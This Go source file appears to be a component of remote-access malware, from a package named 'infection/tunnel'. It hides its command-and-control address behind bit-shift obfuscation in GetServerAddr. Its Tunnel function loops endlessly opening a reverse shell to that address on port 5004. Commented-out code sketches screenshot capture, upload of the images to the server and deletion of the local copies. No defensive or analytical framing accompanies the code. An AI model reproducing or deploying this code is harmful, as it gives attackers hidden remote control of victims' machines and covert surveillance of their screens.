package tunnel

import (
	"infection/tunnel/reverse"
	"unsafe"
)

const (
	EAX = uint8(unsafe.Sizeof(true))
	ONE = "EAX"
)

func GetServerAddr() string {
	var str []byte
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX<<EAX)
	str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX | EAX))
	str = append(str, (EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	return string(str)
}

type Check struct {
	Hostid string `json:"hostid"`
}

func Tunnel(addr string) {
	//var check Check
	for {
		//ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(30, 250)))
		//resp, body, _ := gorequest.New().
		//	Get("http://" + addr + ":5002/browser/tunnel").
		//	End()
		//if resp.StatusCode == 200 && body != "" {
		//	if err := json.Unmarshal([]byte(body), &check); err == nil {
		// if not need  dont open the tunnel to revert shell
		//outip := lib.GetOutIp()
		//if check.Hostid == lib.HOSTID || check.Hostid == outip {
		//	filenames := lib.Getscreenshot()
		//	finflag := make(chan string)
		//	for _, fname := range filenames {
		//		go lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag", finflag)
		//		<-finflag
		//		go lib.Removetempimages(filenames, finflag)
		//	}
		reverse.CreateRevShell("tcp", addr+":5004")
		//}
		//}
		//}
		//<-ticker.C
	}

}
